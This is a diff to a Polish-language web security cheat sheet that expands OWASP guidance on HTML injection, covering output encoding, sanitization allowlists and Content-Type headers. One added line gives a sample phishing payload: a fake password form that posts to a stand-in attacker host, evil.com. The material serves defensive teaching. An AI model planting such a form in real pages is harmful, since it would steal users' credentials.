@@ -45,11 +45,33 @@ curl -X POST "https://TARGET/comment" -d "body=<marquee>HTML Injected</marquee>"
 
 ## CHEATSHEET OWASP — Kluczowe wskazówki
 
-> Źródło: OWASP CheatSheetSeries — Cross_Site_Scripting_Prevention_Cheat_Sheet.md
+> Źródło: OWASP CheatSheetSeries — Cross_Site_Scripting_Prevention_Cheat_Sheet.md, Input_Validation_Cheat_Sheet.md
 
-- Output encode dla kontekstu HTML — uzywaj HTML entity encoding
-- Uzywaj frameworkowego auto-escaping — nie wylaczaj go
-- Sanityzuj user HTML allowlista tagow/atrybutow (DOMPurify)
+### HTML Injection — czym jest
+
+- Atakujacy wstrzykuje HTML ktory jest renderowany w kontekscie przegladarki ofiary
+- Roznica od XSS: HTML injection nie musi zawierac JavaScript — moze to byc falszywy formularz (phishing)
+- Payload: `<form action="https://evil.com/steal"><input name="pass" type="password"><input type="submit" value="Login"></form>`
+
+### Output Encoding — primary defense
+
+- **HTML context**: encode `&`, `<`, `>`, `"`, `'` jako HTML entities
+- **HTML attribute**: encode WSZYSTKIE nie-alfanumeryczne znaki jako `&#xHH;`
+- **URL context**: URL encode parametrow
+- Uzywaj **frameworkowego auto-escaping** — NIE wylaczaj go (React, Angular, Vue domyslnie enkoduja)
+
+### HTML Sanitization
+
+- Jesli MUSISZ akceptowac HTML od uzytkownika — uzyj **DOMPurify** (client) lub **Bleach** (Python)
+- **Allowlist** tagow: `<b>`, `<i>`, `<p>`, `<br>`, `<ul>`, `<li>` — TYLKO bezpieczne tagi
+- **Allowlist** atrybutow: `class`, `id`, `href` (z walidacja URL) — NIGDY event handlers
+- **NIGDY** nie uzywaj regex do sanityzacji HTML — zbyt skomplikowane, latwe do obejscia
+
+### Content-Type i encoding
+
+- Ustaw `Content-Type: text/html; charset=UTF-8` — zapobiega sniffingowi charset
+- Ustaw `X-Content-Type-Options: nosniff` — przegladarka nie bedzie zgadywac typu MIME
+- Brak charset = przegladarka moze zinterpretowac dane w innym encoding → obejscie filtrow
 
 ## ROZSZERZENIA BURP SUITE
 
